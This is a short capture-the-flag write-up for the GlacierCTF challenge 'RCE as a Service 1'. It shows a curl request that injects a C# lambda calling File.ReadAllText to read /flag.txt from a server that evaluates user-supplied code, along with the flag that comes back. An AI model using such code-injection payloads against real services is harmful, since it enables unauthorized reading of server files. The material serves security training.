# Challenge

Cloud computing is trending? Says your grandpa!

Edge Computing is the future! And the future is now. Today!

Give us a lambda and an array to operate on and our modern .NET6-powered backend will compute the results on an edge near your user in no time.

But please don't try to run custom code, because this incident will be reported.

(Goal: Read flag.txt at the filesystem's root.)

https://rce-as-a-service-1.ctf.glacierctf.com

# Writeup

We can execute a lambda on the server. To read the flag, we can use `System.IO.File.ReadAllText`:

```shell
curl --request POST \
--url https://rce-as-a-service-1.ctf.glacierctf.com/rce \
--header 'Content-Type: application/json' \
--data '{
"Data": ["hello", "crypto", "lena"],
"Query": "(data) => data.Select(d => System.IO.File.ReadAllText(@\"/flag.txt\"))"
}'
# => glacierctf{ARE_YOU_AN_3DG3L9RD?}
```